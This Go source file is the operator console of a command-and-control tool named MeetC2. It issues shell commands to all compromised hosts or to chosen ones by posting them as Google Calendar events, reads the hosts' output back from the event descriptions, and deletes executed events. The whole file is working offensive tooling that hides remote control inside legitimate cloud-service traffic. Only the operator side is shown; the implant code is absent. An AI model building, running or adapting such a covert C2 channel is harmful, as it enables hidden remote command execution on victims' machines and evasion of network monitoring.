package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"golang.org/x/oauth2/google"
	"google.golang.org/api/calendar/v3"
	"google.golang.org/api/option"
)

type Organizer struct {
	service    *calendar.Service
	calendarID string
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: organizer <credentials.json> <calendar_id>")
		os.Exit(1)
	}

	organizer, err := NewOrganizer(os.Args[1], os.Args[2])
	if err != nil {
		log.Fatal(err)
	}

	organizer.InteractiveMode()
}

func NewOrganizer(credPath, calendarID string) (*Organizer, error) {
	ctx := context.Background()

	b, err := os.ReadFile(credPath)
	if err != nil {
		return nil, err
	}

	config, err := google.JWTConfigFromJSON(b, calendar.CalendarScope)
	if err != nil {
		return nil, err
	}

	service, err := calendar.NewService(ctx, option.WithHTTPClient(config.Client(ctx)))
	if err != nil {
		return nil, err
	}

	return &Organizer{
		service:    service,
		calendarID: calendarID,
	}, nil
}

func (o *Organizer) InteractiveMode() {
	scanner := bufio.NewScanner(os.Stdin)
	
	fmt.Println("MeetC2 Organizer")
	fmt.Println("Commands:")
	fmt.Println("  exec <cmd>         - Execute on all hosts")
	fmt.Println("  exec @host:<cmd>   - Execute on specific host")
	fmt.Println("  exec @*:<cmd>      - Execute on all hosts (explicit)")
	fmt.Println("  list               - List recent commands")
	fmt.Println("  get <event_id>     - Get command output")
	fmt.Println("  clear              - Clear executed events")
	fmt.Println("  exit               - Exit organizer")
	fmt.Println("----------------------------------------")

	for {
		fmt.Print("> ")
		if !scanner.Scan() {
			break
		}

		input := scanner.Text()
		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "exec":
			if len(parts) < 2 {
				fmt.Println("Usage: exec <command>")
				continue
			}
			cmd := strings.Join(parts[1:], " ")
			o.CreateCommand(cmd)

		case "list":
			o.ListEvents()

		case "get":
			if len(parts) < 2 {
				fmt.Println("Usage: get <event_id>")
				continue
			}
			o.GetEventOutput(parts[1])

		case "clear":
			o.ClearExecutedEvents()

		case "exit":
			return

		default:
			fmt.Println("Unknown command:", parts[0])
		}
	}
}

func (o *Organizer) CreateCommand(command string) {
	event := &calendar.Event{
		Summary: "Meeting from nobody: " + command,
		Start: &calendar.EventDateTime{
			DateTime: time.Now().Add(1 * time.Minute).Format(time.RFC3339),
			TimeZone: "UTC",
		},
		End: &calendar.EventDateTime{
			DateTime: time.Now().Add(30 * time.Minute).Format(time.RFC3339),
			TimeZone: "UTC",
		},
		Description: "",
		ColorId:     "1",
	}

	created, err := o.service.Events.Insert(o.calendarID, event).Do()
	if err != nil {
		fmt.Printf("Error creating command: %v\n", err)
		return
	}

	if strings.HasPrefix(command, "@") {
		target := strings.SplitN(command, ":", 2)[0]
		fmt.Printf("Command created for %s: %s\n", target, created.Id)
	} else {
		fmt.Printf("Command created for all hosts: %s\n", created.Id)
	}
}

func (o *Organizer) ListEvents() {
	events, err := o.service.Events.List(o.calendarID).
		ShowDeleted(false).
		SingleEvents(true).
		TimeMin(time.Now().Add(-24 * time.Hour).Format(time.RFC3339)).
		OrderBy("startTime").
		Do()

	if err != nil {
		fmt.Printf("Error listing events: %v\n", err)
		return
	}

	fmt.Println("\nRecent Commands:")
	fmt.Println("ID\t\tCommand\t\t\tStatus")
	fmt.Println("--------------------------------------------------")

	for _, event := range events.Items {
		if strings.HasPrefix(event.Summary, "Meeting from nobody:") {
			cmd := strings.TrimPrefix(event.Summary, "Meeting from nobody:")
			status := "Pending"
			hosts := o.getExecutedHosts(event.Description)
			if len(hosts) > 0 {
				status = fmt.Sprintf("Executed (%s)", strings.Join(hosts, ", "))
			}
			
			id := event.Id
			if len(id) > 8 {
				id = id[:8] + "..."
			}
			
			fmt.Printf("%s\t%s\t\t%s\n", id, cmd, status)
		}
	}
}

func (o *Organizer) GetEventOutput(eventID string) {
	events, err := o.service.Events.List(o.calendarID).
		ShowDeleted(false).
		Do()
	
	if err != nil {
		fmt.Printf("Error fetching events: %v\n", err)
		return
	}

	for _, event := range events.Items {
		if strings.HasPrefix(event.Id, eventID) {
			fmt.Printf("\nCommand: %s\n", event.Summary)
			fmt.Println("\nOutputs:")
			fmt.Println("========")
			
			// Extract all host outputs
			outputs := o.extractHostOutputs(event.Description)
			if len(outputs) == 0 {
				fmt.Println("Command not yet executed by any host")
			} else {
				for host, output := range outputs {
					fmt.Printf("\n--- Host: %s ---\n", host)
					fmt.Println(strings.TrimSpace(output))
				}
			}
			return
		}
	}
	
	fmt.Println("Event not found")
}

func (o *Organizer) ClearExecutedEvents() {
	events, err := o.service.Events.List(o.calendarID).
		ShowDeleted(false).
		Do()
	
	if err != nil {
		fmt.Printf("Error listing events: %v\n", err)
		return
	}

	count := 0
	for _, event := range events.Items {
		if strings.Contains(event.Description, "[OUTPUT-") {
			err := o.service.Events.Delete(o.calendarID, event.Id).Do()
			if err == nil {
				count++
			}
		}
	}

	fmt.Printf("Cleared %d executed events\n", count)
}

func (o *Organizer) getExecutedHosts(description string) []string {
	var hosts []string
	lines := strings.Split(description, "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "[OUTPUT-") && strings.HasSuffix(line, "]") {
			host := strings.TrimPrefix(line, "[OUTPUT-")
			host = strings.TrimSuffix(host, "]")
			hosts = append(hosts, host)
		}
	}
	return hosts
}

func (o *Organizer) extractHostOutputs(description string) map[string]string {
	outputs := make(map[string]string)
	lines := strings.Split(description, "\n")
	
	var currentHost string
	var capturing bool
	var output strings.Builder
	
	for _, line := range lines {
		if strings.HasPrefix(line, "[OUTPUT-") && !strings.HasPrefix(line, "[/OUTPUT-") {
			currentHost = strings.TrimPrefix(line, "[OUTPUT-")
			currentHost = strings.TrimSuffix(currentHost, "]")
			capturing = true
			output.Reset()
		} else if strings.HasPrefix(line, "[/OUTPUT-") {
			if capturing && currentHost != "" {
				outputs[currentHost] = output.String()
			}
			capturing = false
			currentHost = ""
		} else if capturing {
			if output.Len() > 0 {
				output.WriteString("\n")
			}
			output.WriteString(line)
		}
	}
	
	return outputs
}